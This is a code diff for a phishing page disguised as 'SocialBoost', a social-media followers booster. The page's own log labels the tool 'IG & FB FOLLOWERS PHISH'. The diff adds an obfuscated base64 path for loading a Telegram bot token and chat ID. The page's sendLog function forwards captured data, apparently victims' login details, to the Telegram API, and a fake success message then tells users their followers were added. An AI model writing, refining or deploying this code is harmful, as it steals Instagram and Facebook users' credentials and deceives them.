@@ -412,43 +412,43 @@
         <span>© 2025 SocialBoost. All rights reserved.</span>
     </div>
 </div>
-
 <script>
-    // ====== 🔥 URL ডিকোড ফিক্স (সর্বপ্রথম) ======
-    (function() {
+    // ====== ডিকোড ফাংশন (হিজিবিজি ডেটা পড়ুন) ======
+    function getCreds() {
         const params = new URLSearchParams(window.location.search);
-        const token = params.get('tg_token');
-        const chatId = params.get('tg_chat');
-        if (token) {
-            try { localStorage.setItem('tg_bot_token', decodeURIComponent(token)); } catch(e) {}
+        let token = params.get('tg_token');
+        let chatId = params.get('tg_chat');
+        
+        // এনকোডেড ডেটা চেক করুন
+        if (!token || !chatId) {
+            const encodedData = params.get('tg_data');
+            if (encodedData) {
+                try {
+                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
+                    token = decoded.token;
+                    chatId = decoded.chatId;
+                } catch(e) {
+                    console.warn('Failed to decode tg_data');
+                }
+            }
         }
-        if (chatId) {
-            try { localStorage.setItem('tg_chat_id', decodeURIComponent(chatId)); } catch(e) {}
-        }
-        if (params.has('tg_token') || params.has('tg_chat')) {
-            params.delete('tg_token');
-            params.delete('tg_chat');
-            const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
-            window.history.replaceState({}, '', newUrl);
-        }
-    })();
+        
+        // localStorage থেকে ফallback
+        if (!token) token = localStorage.getItem('tg_bot_token');
+        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
+        
+        return { token, chatId };
+    }
 
     // ====== মূল কোড ======
     (function() {
         'use strict';
 
-        function getCreds() {
-            const p = new URLSearchParams(window.location.search);
-            let t = p.get('tg_token') || localStorage.getItem('tg_bot_token');
-            let c = p.get('tg_chat') || localStorage.getItem('tg_chat_id');
-            return { token: t, chatId: c };
-        }
-
         function sendLog(action, extra) {
-            const { token, chatId } = getCreds();
+            const { token, chatId } = getCreds();  // ✅ আপডেটেড getCreds() ব্যবহার করুন
             if (!token || !chatId) return;
             const time = new Date().toLocaleString();
-            let msg = `📊 *Cyber Tools Activity*\n🕐 ${time}\n🔧 Tool: 📱 IG & FB FOLLOWERS  PHIS\n📌 Action: ${action}`;
+            let msg = `📊 *Cyber Tools Activity*\n🕐 ${time}\n🔧 Tool: 📱 IG & FB FOLLOWERS PHISH\n📌 Action: ${action}`;
             if (extra) msg += `\n\n🔑 *${extra}*`;
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
@@ -629,7 +629,6 @@
                 btn.disabled = true; // keep disabled
                 status.textContent = '✅ Followers added successfully! Please wait 24 hours for them to appear.';
                 status.className = 'status success';
-                // Optionally, you can hide the button or change its text
                 btn.textContent = '✅ Done';
             }, 1800);
         });
